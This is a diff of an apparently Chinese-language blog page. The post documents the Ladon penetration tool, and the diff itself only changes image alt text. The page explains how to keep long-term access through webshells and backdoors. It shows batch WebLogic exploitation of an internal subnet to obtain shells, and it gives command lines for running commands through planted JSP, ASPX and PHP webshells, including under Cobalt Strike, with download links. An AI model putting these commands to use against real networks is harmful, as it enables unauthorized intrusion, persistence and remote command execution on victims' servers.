@@ -203,14 +203,14 @@
     <div class="post-body post-content">
         <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>无论是外网渗透还是内网渗透，为了能够长期控制权限，都会留下各类后门。<br>WebShell无额外进程、无额外端口、不主动向外连接的后门使用频率非常高。<br>外网的有很多管理工具不用说了，但是内网有WebShell机器无法上网怎么办？<br>方案1：代理后管理工具访问，缺点代理卡时，无法连接内网WebShell<br>方案2：使用Ladon，无需代理，只要有SHELL就可以连接内网WebShell</p>
 <p>PS: Shell不只限于WebShell，而是任何可执行命令的，含远控、后门</p>
-<h3 id="一键GetShell"><a href="#一键GetShell" class="headerlink" title="一键GetShell"></a>一键GetShell</h3><p>使用WebLogicExp模块对内网进行Weblogic漏洞扫描并GetShell<br><img alt="image" data-original="/k8img/Ladon/exe/WeblogicExp64.PNG"></p>
+<h3 id="一键GetShell"><a href="#一键GetShell" class="headerlink" title="一键GetShell"></a>一键GetShell</h3><p>使用WebLogicExp模块对内网进行Weblogic漏洞扫描并GetShell<br><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/WeblogicExp64.PNG"></p>
 <p>批量：Ladon 192.168.1.8/24 WeblogicExp</p>
 <h3 id="Ladon-JspShell"><a href="#Ladon-JspShell" class="headerlink" title="Ladon JspShell"></a>Ladon JspShell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Usage：Ladon JspShell <span class="built_in">type</span> url <span class="built_in">pwd</span> cmd</span><br><span class="line">Example: Ladon JspShell ua http://192.168.1.8/shell.jsp Ladon whoami</span><br><span class="line">Example: Ladon JspShell <span class="built_in">cd</span> http://192.168.1.8/shell.jsp Ladon whoami</span><br></pre></td></tr></table></figure>
 
-<p>K8-UA马,类型为1或ua（例子WebLogic）<br><img alt="image" data-original="/k8img/Ladon/exe/JspShellExec.PNG"></p>
-<p>菜刀马,类型为2或cd（例子Struts2）<br><img alt="image" data-original="/k8img/Ladon/exe/JspShell_cd.PNG"></p>
+<p>K8-UA马,类型为1或ua（例子WebLogic）<br><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/JspShellExec.PNG"></p>
+<p>菜刀马,类型为2或cd（例子Struts2）<br><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/JspShell_cd.PNG"></p>
 <h3 id="CS-JspShell"><a href="#CS-JspShell" class="headerlink" title="CS JspShell"></a>CS JspShell</h3><p>Cobalt Strike下Ladon连接内网WebShell，用法和在CMD下一模一样</p>
-<p><img alt="image" data-original="/k8img/Ladon/cs/CS_JspShell.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/cs/CS_JspShell.PNG"></p>
 <h3 id="其它webshell"><a href="#其它webshell" class="headerlink" title="其它webshell"></a>其它webshell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Usage：Ladon WebShell ScriptType ShellType url <span class="built_in">pwd</span> cmd</span><br><span class="line">Example: Ladon WebShell jsp ua http://192.168.1.8/shell.jsp Ladon whoami</span><br><span class="line">Example: Ladon WebShell aspx <span class="built_in">cd</span> http://192.168.1.8/1.aspx Ladon whoami</span><br><span class="line">Example: Ladon WebShell php ua http://192.168.1.8/1.php Ladon whoami</span><br></pre></td></tr></table></figure>
 
 <h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>CS: <a href="https://github.com/k8gege/Aggressor" target="_blank" rel="noopener">https://github.com/k8gege/Aggressor</a><br>Ladon: <a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener">https://github.com/k8gege/Ladon</a></p>
